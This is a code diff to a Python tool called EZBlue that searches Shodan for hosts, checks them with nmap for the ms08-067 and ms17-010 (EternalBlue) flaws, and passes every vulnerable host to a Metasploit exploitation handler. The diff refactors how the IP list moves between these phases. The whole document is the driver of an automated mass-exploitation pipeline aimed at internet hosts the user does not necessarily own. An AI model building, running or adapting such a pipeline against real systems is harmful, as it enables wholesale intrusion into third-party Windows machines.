@@ -33,6 +33,7 @@ def dict_confirm(vuln_dict):
     
     return result
 
+
 parser = argparse.ArgumentParser(prog='EZBlue', description='Identify and exploit hosts that are vulnerable to ms08-067 or ms17-010.')
 # Just do one phase.
 parser.add_argument('--justshodan', '-js', metavar='outputFile', help='Just runs the Shodan searching phase, using any extra queries given, and produces a list of IP addresses which may be vulnerable. Takes in the filename where you want to store the resulting IP addresses. Not usable with --clean, or any other --just* or --no* flags.')
@@ -74,11 +75,14 @@ if args.clean:
 
 # Shodan search phase
 if args.justshodan or args.nonmap or args.noexploit or (not args.justshodan and not args.justnmap and not args.justexploit and not args.noshodan and not args.nonmap and not args.noexploit and not args.clean):
-    output = 'shodan-search.out'
+
+    ip_list = shodan_searcher.query_shodan(query=' '.join(args.queries), limit=args.limit)
+
     if(args.justshodan):
-        output = args.justshodan
-    
-    shodan_searcher.query_shodan(query = ' '.join(args.queries), limit = args.limit, output = output, append = args.append)
+        with open(args.justshodan, 'a' if args.append else 'w') as f:
+            f.write('\n'.join(ip_list))
+        exit()
+
 
 # Nmap vulnerability checking phase
 # vuln_dict = {'ms08-067': [], 'ms17-010-psexec': [], 'ms17-010-eternalblue': []}
@@ -99,8 +103,10 @@ if args.justnmap:
     with open(args.justnmap[1], 'w') as out:
         json.dump(vuln_dict, out)
 
+    exit()
+
 elif args.noexploit:
-    vuln_dict = vuln_checker.check_vulnerable(ip_file='shodan-search.out')
+    vuln_dict = vuln_checker.check_vulnerable(ip_list=ip_list)
     prev = None
 
     if args.append and os.path.exists(args.noexploit):
@@ -118,7 +124,7 @@ elif args.noshodan:
     vuln_dict = vuln_checker.check_vulnerable(ip_file=args.noshodan)
 
 elif not args.justshodan and not args.justnmap and not args.justexploit and not args.noshodan and not args.nonmap and not args.noexploit and not args.clean:
-    vuln_dict = vuln_checker.check_vulnerable(ip_file='shodan-search.out')
+    vuln_dict = vuln_checker.check_vulnerable(ip_list=ip_list)
 
 # Pre-Exploitation
 if args.justexploit:
@@ -130,10 +136,10 @@ if args.justexploit or args.noshodan or args.nonmap or (not args.justshodan and 
     if not vuln_dict['ms08-067'] and not vuln_dict['ms17-010-psexec'] and not vuln_dict['ms17-010-eternalblue']:
         print('No vulnerable hosts were found.')
         sys.exit()
-    
+
     if not args.noconfirmation: # Runs confirmation
         if not dict_confirm(vuln_dict): # Make this functionality richer.
             sys.exit()
-    
+
     print('Going nuclear!\n')
     metasploit_handler.handle_exploitation(exploit_dict=vuln_dict)
